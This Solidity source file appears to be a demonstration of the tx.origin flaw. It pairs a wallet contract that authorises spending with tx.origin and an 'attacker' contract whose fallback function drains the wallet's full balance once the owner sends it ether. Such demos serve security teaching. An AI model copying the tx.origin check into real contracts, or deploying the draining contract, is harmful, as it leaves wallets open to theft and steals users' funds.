pragma solidity ^0.4.0;

contract account{
    address public owner;
    function()payable{}
    function account(){
        owner=msg.sender;
    }
    function spend(address dest,uint x)returns(bool){
        
        if(tx.origin!=owner)
            throw;
        //x=x;
        return dest.call.value(x)();
    }
}
contract attacker{
    address public owner;
    function attacker(){
        owner=msg.sender;
    }
    function()payable{
        account(msg.sender).spend(owner,msg.sender.balance);
    }
}
